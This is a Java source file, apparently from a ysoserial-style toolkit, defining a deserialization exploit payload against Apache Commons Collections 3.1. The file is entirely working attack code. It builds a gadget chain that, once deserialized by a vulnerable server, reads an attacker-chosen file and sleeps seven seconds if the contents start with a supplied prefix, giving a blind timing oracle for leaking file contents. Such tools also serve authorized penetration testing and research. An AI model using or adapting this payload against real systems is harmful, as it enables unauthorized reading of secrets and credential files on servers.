package ysoserial.payloads;

import java.io.File;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;
import javax.management.BadAttributeValueExpException;
import org.apache.commons.collections.PredicateUtils;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.TransformerUtils;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

@SuppressWarnings({"rawtypes", "unchecked"})
@PayloadTest ( precondition = "isApplicableJavaVersion")
@Dependencies({"commons-collections:commons-collections:3.1"})
public class CommonsCollectionsReadFileIfStartsWithSleep7s extends PayloadRunner implements ObjectPayload<BadAttributeValueExpException> {

    public BadAttributeValueExpException getObject(final String command) throws Exception {
        final String[] execArgs = command.split(" ");

        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) }
        );

        final Transformer[] transformers = new Transformer[] {
            TransformerUtils.switchTransformer (
                PredicateUtils.asPredicate(
                    new ChainedTransformer(
                        new Transformer[] {
                            new ConstantTransformer(Class.class),
                            new InvokerTransformer(
                                "forName",
                                new Class[]{ String.class },
                                new Object[]{ "java.util.Scanner"}
                            ),
                            new InstantiateTransformer(
                                new Class[]{ File.class },
                                new Object[]{ new File(execArgs[0]) }
                            ),
                            new InvokerTransformer(
                                "useDelimiter",
                                new Class[]{ String.class },
                                new Object[]{ "\\Z" }
                            ),
                            new InvokerTransformer("next", null, null),
                            new InvokerTransformer("toLowerCase", null, null),
                            new InvokerTransformer(
                                "startsWith",
                                new Class[]{ String.class },
                                new Object[]{ new String(Base64.getDecoder().decode(execArgs[1])) }
                            )
                        }
                    )
                ),
                new ChainedTransformer(
                    new Transformer[] {
                        new ConstantTransformer(Thread.class),
                        new InvokerTransformer(
                            "getMethod",
                            new Class[]{
                                String.class,
                                Class[].class
                            },
                            new Object[]{
                                "sleep",
                                new Class[]{ Long.TYPE }
                            }
                        ),
                        new InvokerTransformer(
                            "invoke",
                            new Class[]{
                                Object.class,
                                Object[].class
                            },
                            new Object[]{
                                null,
                                new Object[] { 7000L }
                            }
                        )
                    }
                ),
                TransformerUtils.nopTransformer()
            )
        };

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        Reflections.setAccessible(valfield);
        valfield.set(val, entry);

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);

        return val;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollectionsReadFileIfStartsWithSleep7s.class, args);
    }

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isBadAttrValExcReadObj();
    }

}
